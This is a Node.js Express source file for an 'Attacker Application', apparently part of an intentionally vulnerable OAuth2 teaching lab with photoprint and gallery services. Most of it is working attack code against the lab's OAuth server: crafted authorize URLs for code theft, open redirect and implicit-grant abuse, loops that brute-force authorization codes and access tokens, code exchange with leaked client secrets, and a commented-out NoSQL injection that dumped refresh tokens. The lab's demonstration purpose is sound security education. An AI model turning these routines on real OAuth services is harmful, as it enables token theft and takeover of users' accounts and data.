const express = require('express');
const expressSession = require('express-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const path = require('path');
const request = require('request');
const gallery = require('./config/gallery.json');
const photoprint = require('./config/photoprint.json');
let galleryConfig = JSON.parse(JSON.stringify(gallery));
let photoprintConfig = JSON.parse(JSON.stringify(photoprint));

if (process.env.GALLERY_URL) {
  galleryConfig.oauth.auth.tokenHost = process.env.GALLERY_URL;
}
if (process.env.CLIENT_ID) {
  photoprintConfig.oauth.client.id = process.env.CLIENT_ID;
  galleryConfig.oauth.client.id = process.env.CLIENT_ID;
}
if (process.env.CLIENT_SECRET) {
  photoprintConfig.oauth.client.secret = process.env.CLIENT_SECRET;
  galleryConfig.oauth.client.secret = process.env.CLIENT_SECRET;
}

let app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: false}));
app.use(cookieParser());
app.use(expressSession({
  secret: process.env.SESSION_SECRET || 'changethistoconfigfile', // externalized via env
  resave: false,
  saveUninitialized: false
}));

//view engine
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

//serve content from public directory
app.use(express.static(path.join(__dirname, 'public')));

// galleryBrowserBase resolves a browser-reachable base URL for gallery from
// whatever Host header the request arrived with, mirroring
// photoprint/app.js's authorizationUrl rewrite (44-60). This works
// regardless of which wildcard-DNS scheme (nip.io, xip.io, ...) or
// localhost/IP a browser is using, since it derives from the incoming Host
// rather than a hardcoded domain.
function galleryBrowserBase(req) {
  if (process.env.GALLERY_BROWSER_URL) {
    return process.env.GALLERY_BROWSER_URL;
  }
  const host = req.get('host') || '';
  if (host.startsWith('attacker:')) {
    // Docker-internal access: gallery resolves fine by its internal DNS name.
    return galleryConfig.oauth.auth.tokenHost;
  }
  return req.protocol + '://' + host.replace(/^attacker/, 'gallery').replace(/:1337$/, ':3005');
}

app.get('/', function(req, res){
  const galleryBrowserHost = galleryBrowserBase(req);
  const selfCallback = req.protocol + '://' + req.get('host') + '/callback';
  res.render('index', {
    stealCodeUrl: galleryBrowserHost + '/oauth/authorize?response_type=code&redirect_uri=' + encodeURIComponent(selfCallback) + '&scope=view_gallery&client_id=photoprint',
    openRedirectUrl: galleryBrowserHost + '/oauth/authorize?response_type=code&redirect_uri=' + encodeURIComponent('http://www.example.com') + '&scope=view_gallery&client_id=photoprint',
    // gallery never restricts which response_type a registered client may
    // request -- switching photoprint (a server-side app meant to be
    // confined to the code flow) to response_type=token gets an access
    // token back directly in the URL fragment instead of a code. See
    // doc/OAuth2_PoC_Verification_Report.md PoC8.
    implicitGrantUrl: galleryBrowserHost + '/oauth/authorize?response_type=token&redirect_uri=' + encodeURIComponent(selfCallback) + '&scope=view_gallery&client_id=photoprint',
  });
});

app.get('/callback', function(req, res){
  var code = req.query.code;
  res.render('authcode', {code: code});
});

function makeRequest(options) {
  return new Promise(function(resolve, reject){
    //using a leaked secret
    request(options, function(err, response, body){
      if(err) return reject(err);
      if(response == undefined || response == null) return reject('undefined'); 
      if (response.statusCode != 200) {
        return reject('Invalid status code <' + response.statusCode + '>');
      }
      resolve(body);
    });
  });
}


app.get('/guessauthzcode', async function(req, res){
  searchSpace = 100000;
  maxGuesses = 10000;
  codes = [];
  for(i = 0; i < maxGuesses; i++) {
    randomguess = Math.floor(Math.random()*Math.floor(searchSpace));
    options = {
      'method':'post',
      'headers':{
        'content-type': 'application/x-www-form-urlencoded'
      },
      'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
      'body':'code='+randomguess+'&redirect_uri=' + photoprint.oauth.client.redirect_uri + '&grant_type=authorization_code&client_id=' + photoprint.oauth.client.id + '&client_secret=' + photoprint.oauth.client.secret
    };
    try {
      response = await makeRequest(options);
      var obj = JSON.parse(response);
      if(obj.access_token != undefined){
        codes.push({'code':randomguess,'token':obj.access_token});
      }

    }catch (error) {
      console.error(error);
    }
  }
  res.render('authcodeguess', {codes: codes});
});

app.get('/guessaccesstokenatresourceserver', async function(req, res){
  searchSpace = 100000;
  maxGuesses = 10000;
  tokens = [];
  for(i = 0; i < maxGuesses; i++) {
    randomguess = Math.floor(Math.random()*Math.floor(searchSpace));
    
    try {
      response = await getPictureUrls2(randomguess);
      var obj = JSON.parse(response);
      if(obj.images != undefined){
        tokens.push(randomguess);
      }

    }catch (error) {
      console.error(error);
    }
  }
  console.log(tokens);
  res.render('tokenguess', {tokens: tokens});
});

async function getPictureUrls2(access_token) {
  if(access_token == undefined) {
    return [];
  }
  options2 = {
    'method':'get',
    'headers':{
      "Accept": "application/json"
    },
    'url':gallery.oauth.auth.tokenHost + gallery.photos + '?access_token=' + access_token
  };
  return await makeRequest(options2);
}

async function getPictureUrls(access_token) {
  response = await getPictureUrls2(access_token);
  images = JSON.parse(response).images;
  return images;
}

app.post('/exchangewithothercreds', async function(req, res){
  var code = req.body.code;
  var clientid = req.body.clientid;
  var secret = req.body.secret;
  var access_token;
  options = {
    'method':'post',
    'headers':{
      'content-type': 'application/x-www-form-urlencoded'
    },
    'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
    'body':'code='+code+'&redirect_uri=http%3A%2F%2Fphotoprint%3A3000%2Fcallback&grant_type=authorization_code&client_id=' + clientid + '&client_secret=' + secret
  };
  try {
    response = await makeRequest(options);
    var obj = JSON.parse(response);
    images = await getPictureUrls(obj.access_token);
    console.log(images);
    res.render('exchangewithothercreds', {code: code, clientid: clientid, basepath: galleryBrowserBase(req) + '/photos/me/', secret:secret, access_token:obj.access_token, images:images});

  }catch (error) {
    console.error(error);
    res.status(500).render(error);
  }
});

// /hashtokens demonstrated a NoSQL injection against gallery's Mongo
// $where clause (refresh_token=this.token made the predicate always-true
// and dumped every refresh token). gallery has since moved to SQLite (see
// insecureapplication-go/z-ai/gallery-sqlite-plan.md), which has no
// equivalent to $where's arbitrary-server-side-JS predicate, so this no
// longer applies -- left commented out rather than deleted, as a record of
// what used to be exploitable here.
//
// app.get('/hashtokens', async function(req, res){
//   options = {
//     'method':'post',
//     'headers':{
//       'content-type': 'application/x-www-form-urlencoded',
//       'Authorization': 'Basic cGhvdG9wcmludDpzZWNyZXQ=',
//     },
//     'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath,
//     'body':'grant_type=refresh_token&refresh_token=this.token'
//   };
//   try {
//     response = await makeRequest(options);
//     var obj = JSON.parse(response);
//     var tokensstr = obj.description.replace('You consumed the following refresh token: ','');
//     var tokens = JSON.parse(tokensstr);
//     console.log(tokens);
//     res.render('hashtokens', {tokens:tokens});
//
//   }catch (error) {
//     console.error(error);
//     res.status(500).render('error');
//   }
// });

app.listen(1337, function () {
  console.log('Attacker Application listening on '+this.address().address +':'+this.address().port);
});
